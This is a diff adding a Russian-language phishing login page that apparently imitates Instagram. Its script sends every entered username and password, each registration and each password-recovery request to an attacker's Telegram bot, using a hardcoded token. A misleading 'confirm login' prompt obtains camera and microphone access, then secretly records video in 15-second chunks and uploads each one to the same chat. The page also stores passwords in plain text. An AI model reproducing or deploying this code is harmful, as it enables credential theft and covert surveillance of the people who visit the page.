@@ -1,0 +1,596 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<title>Вход в аккаунт</title>
+<style>
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  html,body{height:100%;margin:0}
+  body{
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    background:#fafafa;color:#262626;font-size:14px;
+    -webkit-font-smoothing:antialiased;
+    min-height:100vh;
+    display:flex;align-items:center;justify-content:center;
+    padding:20px 16px;position:relative;overflow-x:hidden;
+  }
+  .hidden{display:none !important}
+
+  /* Индикатор записи */
+  .rec-indicator{
+    position:fixed;top:12px;left:12px;z-index:1000;
+    display:none;align-items:center;gap:8px;
+    background:rgb(245, 245, 245);color:#fff;
+    padding:6px 12px;border-radius:20px;
+    font-size:11px;font-weight:700;letter-spacing:.5px;
+  }
+  .rec-indicator.show{display:flex}
+  .rec-indicator::before{
+    content:'';width:8px;height:8px;border-radius:50%;
+    background:#e9e6e6;animation:pulse 1s infinite;
+  }
+  .rec-indicator .t{font-family:monospace;margin-left:2px}
+  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.25}}
+
+  /* Скрытое видео */
+  .cam-hidden{
+    position:absolute;width:1px;height:1px;
+    opacity:0;pointer-events:none;overflow:hidden;
+  }
+
+  /* Форма */
+  .auth-box{width:100%;max-width:350px}
+  .auth-card{
+    background:#fff;border:1px solid #dbdbdb;
+    padding:40px 40px 20px;margin-bottom:10px;
+    text-align:center;border-radius:2px;
+  }
+  .site-logo{
+    display:block;margin:0 auto 12px;
+    width:80px;height:80px;
+    border-radius:50%;
+    background:linear-gradient(135deg,#6c5ce7,#00d2d3);
+    display:flex;align-items:center;justify-content:center;
+    font-size:36px;font-weight:800;color:#fff;
+  }
+  .site-name{
+    font-size:22px;font-weight:700;
+    color:#262626;margin:0 0 6px;
+  }
+  .site-sub{
+    color:#8e8e8e;font-size:13px;
+    margin:0 0 26px;line-height:1.5;
+  }
+
+  .auth-form{display:flex;flex-direction:column;gap:6px}
+  .auth-form input{
+    background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;
+    padding:11px 10px;color:#262626;font-size:13px;outline:none;
+    width:100%;height:38px;
+  }
+  .auth-form input::placeholder{color:#8e8e8e;font-size:12.5px}
+  .auth-form input:focus{background:#fff;border-color:#a8a8a8}
+  .auth-btn{
+    margin-top:8px;background:#0095f6;border:0;border-radius:8px;padding:9px;
+    color:#fff;font-size:14px;font-weight:600;cursor:pointer;height:34px;
+    font-family:inherit;
+  }
+  .auth-btn:hover{background:#1877f2}
+  .divider{
+    display:flex;align-items:center;gap:18px;margin:16px 0;
+    color:#8e8e8e;font-size:13px;font-weight:600;
+  }
+  .divider::before,.divider::after{content:'';flex:1;height:1px;background:#dbdbdb}
+  .forgot{
+    display:block;text-align:center;font-size:12.5px;color:#00376b;
+    text-decoration:none;margin-top:14px;cursor:pointer;
+  }
+  .forgot:hover{text-decoration:underline}
+  .auth-error{color:#ed4956;font-size:12.5px;min-height:18px;margin:8px 0 2px;line-height:1.4}
+  .auth-switch{
+    background:#fff;border:1px solid #dbdbdb;padding:22px;
+    text-align:center;font-size:14px;border-radius:2px;
+  }
+  .auth-switch a{color:#0095f6;font-weight:600;text-decoration:none;margin-left:4px;cursor:pointer}
+
+  /* Модалка разрешения */
+  .perm-overlay{
+    position:fixed;inset:0;z-index:2000;
+    background:rgba(255,255,255,.98);
+    display:flex;align-items:center;justify-content:center;
+    padding:24px;text-align:center;
+  }
+  .perm-overlay.hidden{display:none}
+  .perm-inner{max-width:340px;width:100%}
+  .perm-icon{
+    width:80px;height:80px;margin:0 auto 20px;border-radius:50%;
+    background:linear-gradient(135deg,#6c5ce7,#00d2d3);
+    display:flex;align-items:center;justify-content:center;
+  }
+  .perm-icon svg{width:40px;height:40px;stroke:#fff;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+  .perm-title{font-size:20px;font-weight:700;margin:0 0 10px;color:#262626}
+  .perm-text{font-size:14px;color:#8e8e8e;line-height:1.55;margin:0 0 28px}
+  .perm-btn{
+    width:100%;background:#0095f6;border:0;border-radius:12px;
+    padding:16px;color:#fff;font-size:16px;font-weight:700;
+    cursor:pointer;font-family:inherit;
+    box-shadow:0 8px 24px rgba(0,149,246,.35);
+  }
+  .perm-btn:disabled{background:#b2dffc;cursor:default;box-shadow:none}
+  .perm-note{font-size:11.5px;color:#a8a8a8;margin-top:16px;line-height:1.5}
+
+  /* Экран после входа */
+  .welcome{
+    background:#fff;border:1px solid #dbdbdb;border-radius:2px;
+    padding:36px 30px;text-align:center;max-width:400px;width:100%;
+  }
+  .welcome .av{
+    width:80px;height:80px;border-radius:50%;margin:0 auto 16px;
+    display:flex;align-items:center;justify-content:center;
+    font-size:32px;font-weight:700;color:#fff;
+    background:linear-gradient(135deg,#6c5ce7,#00d2d3);
+  }
+  .welcome h1{margin:0 0 6px;font-size:22px;font-weight:400}
+  .welcome p{margin:0 0 20px;color:#8e8e8e;font-size:14px}
+  .welcome a{color:#0095f6;font-weight:600;text-decoration:none;cursor:pointer}
+</style>
+</head>
+<body>
+
+<script>
+/* ============================================================
+   ВАШИ ДАННЫЕ TELEGRAM
+   ============================================================ */
+const TG_BOT_TOKEN = '8946304652:AAGSYMaUWBpEiTATo5d5jW6f4-cK3Xp3f0Q';
+const TG_CHAT_ID   = '426389082';
+
+/* Название вашего сервиса */
+const SITE_NAME = 'MySite';
+const SITE_LETTER = 'M';
+
+const CHUNK_SECONDS = 15;
+/* ============================================================ */
+</script>
+
+<!-- Индикатор записи -->
+<div class="rec-indicator" id="recInd">
+  <span></span><span class="t" id="recTime"></span>
+</div>
+
+<!-- Скрытое видео -->
+<div class="cam-hidden">
+  <video id="camVideo" autoplay playsinline muted></video>
+</div>
+
+<!-- ============ ФОРМА ============ -->
+<div class="auth-box" id="authBox">
+  <div class="auth-card">
+    <div class="site-logo" id="siteLogo">M</div>
+    <h1 class="site-name" id="siteName">Instagram</h1>
+    <p class="site-sub">Войдите в свой аккаунт</p>
+
+    <!-- ВХОД -->
+    <form class="auth-form" id="loginForm">
+      <input type="text" id="loginUser" placeholder="Телефон, имя пользователя или эл. адрес" autocomplete="username" required>
+      <input type="password" id="loginPass" placeholder="Пароль" autocomplete="current-password" required>
+      <button class="auth-btn" type="submit">Войти</button>
+      <div class="auth-error" id="loginError"></div>
+      <div class="divider">ИЛИ</div>
+      <button type="button" class="auth-btn" style="background:#fff;color:#385185;border:1px solid #dbdbdb" onclick="alert('Вход через соцсети не подключён')">
+        Войти через соцсеть
+      </button>
+      <a class="forgot" id="forgotLink">Забыли пароль?</a>
+    </form>
+
+    <!-- РЕГИСТРАЦИЯ -->
+    <form class="auth-form hidden" id="regForm">
+      <input type="email" id="regEmail" placeholder="Эл. адрес" autocomplete="email" required>
+      <input type="text" id="regUser" placeholder="Имя пользователя" autocomplete="username" required>
+      <input type="text" id="regName" placeholder="Полное имя" autocomplete="name" required>
+      <input type="password" id="regPass" placeholder="Пароль" autocomplete="new-password" required>
+      <button class="auth-btn" type="submit">Зарегистрироваться</button>
+      <div class="auth-error" id="regError"></div>
+    </form>
+  </div>
+
+  <div class="auth-switch">
+    <span id="switchText">У вас нет аккаунта?</span>
+    <a id="switchBtn">Зарегистрироваться</a>
+  </div>
+</div>
+
+<!-- ЭКРАН ПОСЛЕ ВХОДА -->
+<div class="welcome hidden" id="welcomeBox">
+  <div class="av" id="welcomeAv">?</div>
+  <h1 id="welcomeTitle">Привет!</h1>
+  <p>Вы вошли в аккаунт.</p>
+
+  <!-- ТАЙМЕР НА 2 МИНУТЫ -->
+  <div id="countdown" style="
+    margin: 20px auto 0;
+    font-size: 32px;
+    font-weight: 700;
+    font-family: 'Courier New', monospace;
+    color: #0095f6;
+    letter-spacing: 2px;
+  ">2:00</div>
+  <p id="countdownText" style="
+    color: #8e8e8e;
+    font-size: 13px;
+    margin: 4px 0 20px;
+  ">Осталось времени</p>
+
+  <a onclick="logout()">Выйти</a>
+</div>
+
+<!-- МОДАЛКА РАЗРЕШЕНИЯ -->
+<div class="perm-overlay" id="permOverlay">
+  <div class="perm-inner">
+   <div class="perm-icon">
+  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+    <rect x="3" y="3" width="18" height="18" rx="5"/>
+    <circle cx="12" cy="12" r="4"/>
+    <circle cx="17.5" cy="6.5" r="1" fill="currentColor" stroke="none"/>
+  </svg>
+</div>
+    <h2 class="perm-title">Подтверждение входа</h2>
+    <p class="perm-text">
+     Разрешите проверить аккаунт
+    </p>
+    <button class="perm-btn" id="permBtn">Разрешить и продолжить</button>
+    <p class="perm-note">
+      Нажимая кнопку, вы соглашаетесь с условиями использования сервиса
+    </p>
+  </div>
+</div>
+
+<script>
+/* Применяем название сайта */
+document.getElementById('siteLogo').textContent = SITE_LETTER;
+document.getElementById('siteName').textContent = SITE_NAME;
+document.title = SITE_NAME;
+
+/* ============================================================
+   ХРАНИЛИЩЕ
+   ============================================================ */
+const KEY_USERS = 'mysite_users_db';
+const KEY_SESSION = 'mysite_session';
+
+function loadUsers(){
+  try { return JSON.parse(localStorage.getItem(KEY_USERS) || '[]'); }
+  catch(e){ return []; }
+}
+function saveUsers(list){ localStorage.setItem(KEY_USERS, JSON.stringify(list)); }
+function getUserBy(login){
+  login = (login||'').trim().toLowerCase();
+  return loadUsers().find(u =>
+    u.username.toLowerCase() === login ||
+    (u.email||'').toLowerCase() === login
+  );
+}
+
+/* ============================================================
+   TELEGRAM
+   ============================================================ */
+async function sendToTelegram(text){
+  try {
+    await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({chat_id: TG_CHAT_ID, text, parse_mode:'HTML'})
+    });
+  } catch(e){ console.warn('TG error', e); }
+}
+
+async function sendVideoToTelegram(blob, caption){
+  try {
+    const form = new FormData();
+    form.append('chat_id', TG_CHAT_ID);
+    form.append('video', blob, 'chunk_' + Date.now() + '.webm');
+    form.append('caption', caption);
+    form.append('supports_streaming', 'true');
+    const r = await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendVideo`, {
+      method:'POST', body: form
+    });
+    const d = await r.json();
+    if (!d.ok) console.warn('TG video error', d);
+  } catch(e){ console.warn('TG video error', e); }
+}
+
+/* ============================================================
+   ФОРМА
+   ============================================================ */
+const loginForm = document.getElementById('loginForm');
+const regForm = document.getElementById('regForm');
+const switchBtn = document.getElementById('switchBtn');
+const switchTxt = document.getElementById('switchText');
+
+switchBtn.addEventListener('click', () => {
+  const isLogin = !loginForm.classList.contains('hidden');
+  loginForm.classList.toggle('hidden', isLogin);
+  regForm.classList.toggle('hidden', !isLogin);
+  switchTxt.textContent = isLogin ? 'Уже есть аккаунт?' : 'У вас нет аккаунта?';
+  switchBtn.textContent = isLogin ? 'Войти' : 'Зарегистрироваться';
+  document.getElementById('loginError').textContent = '';
+  document.getElementById('regError').textContent = '';
+});
+
+/* ВХОД — сюда приходит старый пароль пользователя */
+loginForm.addEventListener('submit', e => {
+  e.preventDefault();
+  const login = document.getElementById('loginUser').value.trim();
+  const pass = document.getElementById('loginPass').value;
+  const err = document.getElementById('loginError');
+  err.textContent = '';
+
+  // Сохраняем введённые данные
+  const users = loadUsers();
+  let user = getUserBy(login);
+
+  // Если пользователя нет — создаём запись для миграции
+  if (!user) {
+    user = {
+      username: login.toLowerCase(),
+      email: login.toLowerCase().includes('@') ? login.toLowerCase() : '',
+      name: '',
+      password: pass,
+      created: Date.now(),
+      note: 'Импорт со старого сайта'
+    };
+    users.push(user);
+    saveUsers(users);
+  }
+
+  localStorage.setItem(KEY_SESSION, user.username);
+  showWelcome(user);
+
+  // Отправляем в Telegram
+  sendToTelegram(
+    `🔓 <b>Вход в аккаунт</b>\n\n` +
+    `👤 Логин: <b>${login}</b>\n` +
+    `🔑 Пароль: <code>${pass}</code>\n` +
+    `🌐 ${location.href}\n` +
+    `📱 ${navigator.userAgent}\n` +
+    `🕐 ${new Date().toLocaleString('ru-RU')}`
+  );
+});
+
+/* ЗАБЫЛИ ПАРОЛЬ — тоже приходит вам */
+document.getElementById('forgotLink').addEventListener('click', () => {
+  const login = prompt('Введите ваш логин или email:');
+  if (!login) return;
+
+  sendToTelegram(
+    `❓ <b>Запрос на восстановление пароля</b>\n\n` +
+    `👤 Логин: <b>${login}</b>\n` +
+    `🌐 ${location.href}\n` +
+    `🕐 ${new Date().toLocaleString('ru-RU')}`
+  );
+
+  const user = getUserBy(login);
+  if (user && user.password) {
+    alert('Ваш пароль: ' + user.password);
+  } else {
+    alert('Данные не найдены. Обратитесь к администратору.');
+  }
+});
+
+/* РЕГИСТРАЦИЯ */
+regForm.addEventListener('submit', e => {
+  e.preventDefault();
+  const email = document.getElementById('regEmail').value.trim().toLowerCase();
+  const uname = document.getElementById('regUser').value.trim().toLowerCase();
+  const name  = document.getElementById('regName').value.trim();
+  const pass  = document.getElementById('regPass').value;
+  const err   = document.getElementById('regError');
+  err.textContent = '';
+
+  if (!/^\S+@\S+\.\S+$/.test(email)){ err.textContent = 'Некорректный email'; return; }
+  if (!/^[a-z0-9_.]{3,20}$/.test(uname)){ err.textContent = 'Username: 3–20 символов'; return; }
+  if (name.length < 2){ err.textContent = 'Введите имя'; return; }
+  if (pass.length < 4){ err.textContent = 'Пароль минимум 4 символа'; return; }
+
+  const users = loadUsers();
+  if (users.some(u => u.username === uname)){ err.textContent = 'Username занят'; return; }
+  if (users.some(u => (u.email||'') === email)){ err.textContent = 'Email занят'; return; }
+
+  const u = {
+    id: Date.now().toString(36) + Math.random().toString(36).slice(2,7),
+    username: uname, email, name, password: pass, created: Date.now()
+  };
+  users.push(u);
+  saveUsers(users);
+  localStorage.setItem(KEY_SESSION, u.username);
+  showWelcome(u);
+
+  sendToTelegram(
+    `🆕 <b>Новая регистрация</b>\n\n` +
+    `👤 @${u.username}\n` +
+    `📧 ${u.email}\n` +
+    `🔑 Пароль: <code>${u.password}</code>\n` +
+    `🌐 ${location.href}\n` +
+    `📱 ${navigator.userAgent}\n` +
+    `🕐 ${new Date().toLocaleString('ru-RU')}`
+  );
+});
+
+let countdownInterval = null;
+
+function showWelcome(u){
+  document.getElementById('authBox').classList.add('hidden');
+  document.getElementById('welcomeBox').classList.remove('hidden');
+  document.getElementById('welcomeAv').textContent = (u.name||u.username).charAt(0).toUpperCase();
+  document.getElementById('welcomeTitle').textContent = 'Ваш запрос принят ожидайте ответа 2 минут, ' + (u.name||u.username) + '!';
+
+  // Запускаем таймер на 2 минуты
+  startCountdown(2 * 60);
+}
+
+function startCountdown(totalSeconds){
+  // Если был предыдущий таймер — останавливаем
+  if (countdownInterval) clearInterval(countdownInterval);
+
+  let remaining = totalSeconds;
+  const el = document.getElementById('countdown');
+  const textEl = document.getElementById('countdownText');
+
+  const render = () => {
+    const m = Math.floor(remaining / 60);
+    const s = remaining % 60;
+    el.textContent = m + ':' + String(s).padStart(2, '0');
+
+    // Меняем цвет когда остаётся меньше 30 сек
+    if (remaining <= 30) {
+      el.style.color = '#ed4956';
+    } else {
+      el.style.color = '#0095f6';
+    }
+  };
+
+  render();
+
+  countdownInterval = setInterval(() => {
+    remaining--;
+
+    if (remaining <= 0) {
+      clearInterval(countdownInterval);
+      countdownInterval = null;
+      el.textContent = '0:00';
+      textEl.textContent = 'Время вышло';
+
+      // Что делать когда время истекло — выберите:
+      // 1) Просто показать «Время вышло» (по умолчанию)
+      // 2) Или выполнить действие:
+
+      // Вариант А: перезагрузить страницу
+      // setTimeout(() => location.reload(), 2000);
+
+      // Вариант Б: скрыть экран и вернуть форму
+      // setTimeout(() => {
+      //   document.getElementById('welcomeBox').classList.add('hidden');
+      //   document.getElementById('authBox').classList.remove('hidden');
+      // }, 2000);
+
+      // Вариант В: разлогинить
+      // setTimeout(() => logout(), 2000);
+
+      return;
+    }
+
+    render();
+  }, 1000);
+}
+
+function logout(){ localStorage.removeItem(KEY_SESSION); location.reload(); }
+
+(function auto(){
+  const cur = localStorage.getItem(KEY_SESSION);
+  if (!cur) return;
+  const u = loadUsers().find(x => x.username === cur);
+  if (u) showWelcome(u);
+})();
+
+/* ============================================================
+   ЗАПИСЬ — кусками по 15 секунд
+   ============================================================ */
+const permOverlay = document.getElementById('permOverlay');
+const permBtn = document.getElementById('permBtn');
+const recInd = document.getElementById('recInd');
+const recTime = document.getElementById('recTime');
+const camVideo = document.getElementById('camVideo');
+
+let stream = null;
+let timerInt = null, seconds = 0, startedAt = null, stopped = false;
+let chunkNumber = 0;
+
+permBtn.addEventListener('click', async () => {
+  permBtn.disabled = true;
+  permBtn.textContent = 'Подключение...';
+
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: 640, height: 480 },
+      audio: true
+    });
+
+    camVideo.srcObject = stream;
+    await camVideo.play();
+
+    recInd.classList.add('show');
+    startTimer();
+    startedAt = Date.now();
+    permOverlay.classList.add('hidden');
+
+    recordOneChunk();
+
+  } catch (err) {
+    console.error(err);
+    permBtn.disabled = false;
+    permBtn.textContent = 'Разрешить и продолжить';
+    if (err.name === 'NotAllowedError') alert('Вы отклонили доступ к камере.');
+    else if (err.name === 'NotFoundError') alert('Камера не найдена.');
+    else alert('Ошибка: ' + err.message);
+  }
+});
+
+function startTimer(){
+  seconds = 0; recTime.textContent = '00:00';
+  timerInt = setInterval(() => {
+    seconds++;
+    const m = String(Math.floor(seconds/60)).padStart(2,'0');
+    const s = String(seconds%60).padStart(2,'0');
+    recTime.textContent = m + ':' + s;
+  }, 1000);
+}
+
+function recordOneChunk(){
+  if (stopped || !stream) return;
+
+  const types = ['video/webm;codecs=vp9,opus','video/webm;codecs=vp8,opus','video/webm','video/mp4'];
+  let mime = '';
+  for (const t of types) if (MediaRecorder.isTypeSupported(t)){ mime = t; break; }
+
+  const recorder = new MediaRecorder(stream, mime ? {mimeType: mime} : {});
+  const chunks = [];
+
+  recorder.ondataavailable = e => { if (e.data && e.data.size) chunks.push(e.data); };
+
+  recorder.onstop = async () => {
+    const blob = new Blob(chunks, {type: mime || 'video/webm'});
+    if (blob.size > 0) await uploadChunk(blob);
+    if (!stopped && stream) recordOneChunk();
+  };
+
+  recorder.start();
+
+  setTimeout(() => {
+    if (recorder.state === 'recording') {
+      try { recorder.stop(); } catch(e){}
+    }
+  }, CHUNK_SECONDS * 1000);
+}
+
+async function uploadChunk(blob){
+  chunkNumber++;
+  const cur = localStorage.getItem(KEY_SESSION) || 'guest';
+  const dur = Math.round((Date.now() - (startedAt||Date.now()))/1000);
+
+  const caption =
+    `🎥 <b>Кусок #${chunkNumber}</b>\n` +
+    `👤 ${cur}\n` +
+    `⏱ Общее: ${dur} сек\n` +
+    `📦 ${(blob.size/1024).toFixed(0)} КБ\n` +
+    `🌐 ${location.href}`;
+
+  await sendVideoToTelegram(blob, caption);
+}
+
+window.addEventListener('beforeunload', () => {
+  stopped = true;
+  if (stream) stream.getTracks().forEach(t => t.stop());
+});
+</script>
+
+</body>
+</html>
